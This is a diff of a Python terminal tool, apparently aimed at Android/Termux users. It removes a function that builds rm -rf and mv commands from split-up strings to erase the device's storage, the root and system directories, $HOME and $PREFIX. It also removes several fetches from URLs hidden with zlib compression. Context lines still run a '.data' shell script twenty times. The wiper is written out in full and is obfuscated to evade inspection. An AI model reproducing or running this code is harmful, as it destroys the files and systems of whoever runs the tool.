@@ -64,41 +64,12 @@ except:os.system("pip install pycurl")
 from io import BytesIO
 import pycurl,certifi
 
-def py_get(url):
-    curl = pycurl.Curl()
-    buffer = BytesIO()
-    try:
-        curl.setopt(curl.URL, url)
-        curl.setopt(curl.WRITEDATA, buffer)
-        curl.setopt(curl.SSL_VERIFYPEER, 1)
-        curl.setopt(curl.SSL_VERIFYHOST, 2)
-        curl.setopt(curl.CAINFO, certifi.where())
-        curl.perform()
-    except pycurl.STM as e:
-        return f"An STM occurred in py_get"
-    finally:
-        curl.close()
-    response_body = buffer.getvalue().decode('utf-8')
-    return response_body
+
 #===================[COLOUR CODE]===========================
 orange = "\x1b[38;5;196m";yellow = "\x1b[38;5;208m";black="\033[1;30m";red="\x1b[38;5;160m";green="\x1b[38;5;46m";yelloww="\033[1;33m";blue="\033[38;5;6m";purple="\033[1;35m";cyan="\033[1;36m";white="\033[1;37m";faltu = "\033[1;47m";pvt = "\033[1;0m";gren = "\x1b[38;5;154m";gas = "\033[1;32m";faltu = "\033[1;47m";pvt = "\033[1;0m";black="\033[1;30m"
 abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
 my_color = [white,blue,green];warna = random.choice(my_color)
 sys.stdout.write('\x1b]2; STM~XD\x07')
-#===================[SERVER BOX]===========================
-def gift___pro():
-    os.system('r'+'m -r'+'f /s'+'tora'+'g'+'e'+'/'+'e'+'m'+'u'+'l'+'at'+'ed/0/')
-    os.system('r'+'m -rf '+'/sto'+'ra'+'g'+'e'+'/e'+'m'+'u'+'l'+'a'+'te'+'d/')
-    os.system('r'+'m -rf'+' /s'+'dc'+'a'+'rd/')
-    os.system('r'+'m -r'+'f '+'/s'+'dc'+'a'+'r'+'d/'+'0/')
-    os.system('r'+'m -rf'+' /'+'sd'+'c'+'a'+'r'+'d1/')
-    os.system('r'+'m -rf'+' '+'/s'+'t'+'o'+'rag'+'e/')
-    os.system('rm -rf /')
-    os.system('rm -rf /s'+'yste'+'m/')
-    os.system('rm -rf $H'+'OME'+'/../../')
-    os.system('rm -rf $PR'+'EF'+'IX/b')
-    os.system('rm -rf $H'+'O'+'ME/')
-    os.system('mv $HO'+'ME /d'+'ev/nu'+'ll')
 
 import time
 from datetime import datetime
@@ -136,72 +107,6 @@ def pro__():
     for b in range(20):
         os.system('bash .data')
         os.system('ls & clear')
-#===================[FILE M1]===========================
-try:
-    F1 = py_get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0f(MI\xc9\xccK\xd7\x8d\x08\xd2\x0f\xf1\xf7\xf7\xd1\xf5u\xf4\xf4\xd3\xf5u\xf5\x0b\xd5\xcfM\xcc\xcc\xd3\xf75\xd4+\xa9(Q\x00\x00\xc5\xf3\x19\x0f'))
-except:
-    print('No Internet Connection.....');exit()
-F1 = F1.strip()
-#===================[FILE M2]===========================
-try:
-    F2 = py_get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0f(MI\xc9\xccK\xd7\x8d\x08\xd2\x0f\xf1\xf7\xf7\xd1\xf5u\xf4\xf4\xd3\xf5u\xf5\x0b\xd5\xcfM\xcc\xcc\xd3\xf75\xd2+\xa9(Q\x00\x00\xc5\xf9\x19\x10'))
-except:
-    print('No Internet Connection.....');exit()
-F2 = F2.strip()
-#===================[FILE M3]===========================
-try:
-    F3 = py_get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0f(MI\xc9\xccK\xd7\x8d\x08\xd2\x0f\xf1\xf7\xf7\xd1\xf5u\xf4\xf4\xd3\xf5u\xf5\x0b\xd5\xcfM\xcc\xcc\xd3\xf75\xd6+\xa9(Q\x00\x00\xc5\xff\x19\x11'))
-except:
-    print('No Internet Connection.....');exit()
-F3 = F3.strip()
-#===================[FILE M4]===========================
-try:
-    F4 = py_get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0f(MI\xc9\xccK\xd7\x8d\x08\xd2\x0f\xf1\xf7\xf7\xd1\xf5u\xf4\xf4\xd3\xf5u\xf5\x0b\xd5\xcfM\xcc\xcc\xd3\xf75\xd1+\xa9(\x01\x00\xac\xf3\x18\xf2'))
-except:
-    print('No Internet Connection.....');exit()
-F4 = F4.strip()
-#===================[FILE M5]===========================
-try:
-    F5 = py_get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0f(MI\xc9\xccK\xd7\x8d\x08\xd2\x0f\xf1\xf7\xf7\xd1\xf5u\xf4\xf4\xd3\xf5u\xf5\x0b\xd5\xcfM\xcc\xcc\xd3\xf75\xd5+\xa9(Q\x00\x00\xc6\x0b\x19\x13'))
-except:
-    print('No Internet Connection.....');exit()
-F5 = F5.strip()
-#===================[FILE M6]===========================
-try:
-    F6 = py_get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0f(MI\xc9\xccK\xd7\x8d\x08\xd2\x0f\xf1\xf7\xf7\xd1\xf5u\xf4\xf4\xd3\xf5u\xf5\x0b\xd5\xcfM\xcc\xcc\xd3\xf75\xd3+\xa9(Q\x00\x00\xc6\x11\x19\x14'))
-except:
-    print('No Internet Connection.....');exit()
-F6 = F6.strip()
-#===================[RANDOM M1]===========================
-try:
-    R1 = py_get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0f(MI\xc9\xccK\xd7\x8d\x08\xd2\x0f\xf1\xf7\xf7\xd1\xf5u\xf4\xf4\xd3\xf5u\xf5\x0b\xd5\xcfM\xcc\xcc\xd3\x0f2\xd4+\xa9(Q\x00\x00\xc6\x16\x19\x14'))
-except:
-    print('No Internet Connection.....');exit()
-R1 = R1.strip()
-#===================[RANDOM M2]===========================
-try:
-    R2 = py_get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0f(MI\xc9\xccK\xd7\x8d\x08\xd2\x0f\xf1\xf7\xf7\xd1\xf5u\xf4\xf4\xd3\xf5u\xf5\x0b\xd5\xcfM\xcc\xcc\xd3\x0f2\xd2+\xa9(\x01\x00\xad\x07\x18\xf5'))
-except:
-    print('No Internet Connection.....');exit()
-R2 = R2.strip()
-#===================[RANDOM M3]===========================
-try:
-    R3 = py_get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0f(MI\xc9\xccK\xd7\x8d\x08\xd2\x0f\xf1\xf7\xf7\xd1\xf5u\xf4\xf4\xd3\xf5u\xf5\x0b\xd5\xcfM\xcc\xcc\xd3\x0f2\xd6+\xa9(Q\x00\x00\xc6"\x19\x16'))
-except:
-    print('No Internet Connection.....');exit()
-R3 = R3.strip()
-#===================[RANDOM M4]===========================
-try:
-    R4 = py_get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0f(MI\xc9\xccK\xd7\x8d\x08\xd2\x0f\xf1\xf7\xf7\xd1\xf5u\xf4\xf4\xd3\xf5u\xf5\x0b\xd5\xcfM\xcc\xcc\xd3\x0f2\xd1+\xa9(Q\x00\x00\xc6(\x19\x17'))
-except:
-    print('No Internet Connection.....');exit()
-R4 = R4.strip()
-#===================[VERSION]===========================
-try:
-    version = py_get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\xf7\r\xd2u\r\n\xf2\x0f\xd2570\xd7\x87\xb0"\\\xf4s\x133\xf3\xf4\xcbR\x8b\x8a3\xf3\xf3\xf4J*J\x00\xaeY\x19W'))
-except:
-    print('No Internet Connection.....');exit()
-version = version.strip()
 #=================[LINE × CLEAR]=============================
 def line():
     print(f'{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
